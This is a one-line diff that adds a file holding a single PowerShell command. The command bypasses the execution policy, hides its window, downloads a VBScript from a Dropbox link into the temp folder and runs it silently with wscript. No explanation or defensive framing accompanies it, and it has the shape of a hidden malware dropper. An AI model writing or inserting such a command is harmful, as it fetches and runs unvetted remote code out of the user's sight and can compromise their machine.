@@ -1,0 +1,1 @@
+powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/zml5yox7saix5i6ivmblt/runscript.vbs?rlkey=g2ogfbm6uwl7a1pa2vxhluwni&st=nw56htuz&dl=1' -OutFile ($env:TEMP + '\\runscript.vbs'); if (Test-Path ($env:TEMP + '\\runscript.vbs')) { wscript.exe //B ($env:TEMP + '\\runscript.vbs') }"
